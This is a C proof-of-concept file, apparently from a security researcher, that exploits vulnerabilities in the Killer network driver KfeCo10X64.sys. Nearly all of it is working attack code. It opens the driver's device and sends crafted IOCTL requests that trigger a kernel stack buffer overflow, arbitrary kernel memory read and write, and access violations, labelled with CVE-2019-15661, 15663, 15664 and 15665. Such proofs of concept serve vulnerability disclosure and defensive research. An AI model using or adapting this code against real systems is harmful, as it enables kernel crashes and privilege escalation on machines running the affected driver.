#include <stdio.h>
#include <Windows.h>

/*
Killer traffic control callout driver multiple vulnerabilities
version: 9.2.3.67
md5: 0EECDDA5B0A2C87705E7CBE4C62E5A7A

0: kd> lmvm KfeCo10X64
start             end                 module name
fffff801`34a70000 fffff801`35b89000   KfeCo10X64   (no symbols)
	Loaded symbol image file: KfeCo10X64.sys
	Image path: \SystemRoot\System32\drivers\RivetNetworks\Killer\KfeCo10X64.sys
	Image name: KfeCo10X64.sys
	Browse all global symbols  functions  data
	Timestamp:        Wed May  1 13:11:33 2019 (5CC9FD75)



dhanesh.kizhakkinan@fireeye.com
*/


//0x120004
void stack_bof()
{
	HANDLE hFile = CreateFileW(L"\\\\.\\KfeCoDriver", 0xC0000000, 3u, 0i64, 3u, 0, 0i64);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("Cannot open driver!\n");
		return;
	}
	DWORD bufSize = 2 * 1024;
	BYTE* inpBuf = (BYTE*)malloc(bufSize);		//0x48
	DWORD32 outBuf[18];
	DWORD ret = 0;
	memset(inpBuf, 0x41, bufSize);
	memset(outBuf, 0x00, 0x48);

	if (DeviceIoControl(hFile, 0x120004, (LPVOID)inpBuf, bufSize, (LPVOID)outBuf, 0x48, &ret, NULL))
	{
		printf("Send success!\n");
		printf("data: %08x\n", outBuf[0]);
	}
	CloseHandle(hFile);
}

//IOCTL: 0x120444
void arb_read()
{
	HANDLE hFile = CreateFileW(L"\\\\.\\KfeCoDriver", 0xC0000000, 3u, 0i64, 3u, 0, 0i64);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("Cannot open driver!\n");
		return;
	}
	DWORD bufSize = 2 * 1024;
	DWORD32 inpBuf[18];		//0x48
	DWORD32 outBuf[18];
	DWORD ret = 0;
	memset(inpBuf, 0x41, 0x48);
	memset(outBuf, 0x00, 0x48);
	inpBuf[0] = 0xDEC0DEF3;
	inpBuf[1] = 0x0209f9a6;	//ptr to read ~ 0x41414141

	if (DeviceIoControl(hFile, 0x120444u, (LPVOID)inpBuf, 0x48, (LPVOID)outBuf, 0x48, &ret, NULL))
	{
		printf("Send success!\n");
		printf("data: %08x\n", outBuf[0]);
	}
	CloseHandle(hFile);
}
//IOCTL: 0x120448
void arb_write_0()
{
	HANDLE hFile = CreateFileW(L"\\\\.\\KfeCoDriver", 0xC0000000, 3u, 0i64, 3u, 0, 0i64);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("Cannot open driver!\n");
		return;
	}
	DWORD32 inpBuf[18];		//0x48
	DWORD32 outBuf[18];
	DWORD ret = 0;
	memset(inpBuf, 0x41, 0x48);
	memset(outBuf, 0x00, 0x48);
	inpBuf[0] = 0xDE30ADD3;
	inpBuf[1] = 0x0209f9a6;	//ptr to write ~ 0x41414141
	inpBuf[2] = 2;
	inpBuf[3] = 0x10;
	if (DeviceIoControl(hFile, 0x120448, (LPVOID)inpBuf, 0x48, (LPVOID)outBuf, 0x48, &ret, NULL))
	{
		printf("Send success!\n");
		printf("data: %08x\n", outBuf[0]);
	}
	CloseHandle(hFile);
}

void read_av(DWORD ioctl, DWORD32 val)
{
	HANDLE hFile = CreateFileW(L"\\\\.\\KfeCoDriver", 0xC0000000, 3u, 0i64, 3u, 0, 0i64);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("Cannot open driver!\n");
		return;
	}
	DWORD32 inpBuf[18];		//0x48
	DWORD32 outBuf[18];
	DWORD ret = 0;
	memset(inpBuf, 0x41, 0x48);
	memset(outBuf, 0x00, 0x48);
	inpBuf[0] = val;		

	if (DeviceIoControl(hFile, ioctl, (LPVOID)inpBuf, 0x48, (LPVOID)outBuf, 0x48, &ret, NULL))
	{
		printf("Send success!\n");
		printf("data: %08x\n", outBuf[0]);
	}
	CloseHandle(hFile);
}

int main()
{
	//comment other function calls to work on a specific vulnerability
	stack_bof(); // CVE-2019-15661
	arb_read();  // CVE-2019-15661
	arb_write_0(); // CVE-2019-15665
	read_av(0x120404, 0x5e9c); // CVE-2019-15663
	read_av(0x120418, 0x5e9c); // CVE-2019-15664

	return 0;
}
